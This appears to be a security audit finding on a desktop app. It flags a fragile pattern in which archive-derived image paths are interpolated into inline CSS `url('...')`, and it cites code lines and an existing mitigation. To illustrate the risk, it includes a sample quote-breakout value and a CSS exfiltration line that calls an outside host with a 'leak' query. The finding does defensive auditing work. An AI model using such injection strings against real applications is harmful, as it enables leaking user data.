# A3-05 — Archive-derived photo_path interpolated into inline CSS background url()

**Severity:** Low
**CWE:** CWE-79 (CSS injection) / CWE-116 (improper output encoding)
**Status:** Open
**Location:** project-code/src/App.tsx:8322 (and :6317); photo_path written from import at project-code/src-tauri/src/lib.rs:5055
**Vuln class:** CSS context output encoding (string interpolation into url('...'))

## Exploit sketch
`apply_chat_modifications` (lib.rs:5055) writes `photo_path` from imported modification JSON (archive-controlled via import_from_export) into the profiles table. chatBackground is normally user-picked, but the same interpolation pattern is used for archive-derived paths. At App.tsx:8322 a path is interpolated into `backgroundImage: url('<path>')` only when it does NOT start with `/app_backgrounds/`, in which case it is wrapped via `convertFileSrc(...)`. `convertFileSrc` percent-encodes into an `asset://` URL, which largely neutralizes a single-quote breakout — so this is not a confirmed escape today. Flagged because the pattern (untrusted string → inline `url('...')`) is fragile: any future path that bypasses `convertFileSrc` (e.g. the `startsWith("/app_backgrounds/")` branch, or `startsWith("/")` branch at :6551) is interpolated raw and a value like `/app_backgrounds/x'); ...` would break the CSS string under `style-src 'unsafe-inline'`.

## Why this matters
Defense-in-depth: an archive that controls a path string reaching the raw branch could inject CSS (e.g. exfil via `background:url(https://unpkg.com/?leak)` allowed by CSP A3-04). Currently mitigated by convertFileSrc on the reachable archive branch.

## Evidence
```
src/App.tsx
8322: style={... chatBackground ? { backgroundImage: `url('${chatBackground.startsWith("/app_backgrounds/") ? chatBackground : convertFileSrc(chatBackground)}')` ...} : {}}
6551: src={entry.background_path.startsWith("/") ? entry.background_path : convertFileSrc(entry.background_path)}

src-tauri/src/lib.rs
5055: let photo_path = mod_entry.get("photo_path").and_then(|v| v.as_str()).map(...);  // archive-controlled
5065: "INSERT INTO profiles (..., photo_path, ...) ..."
```
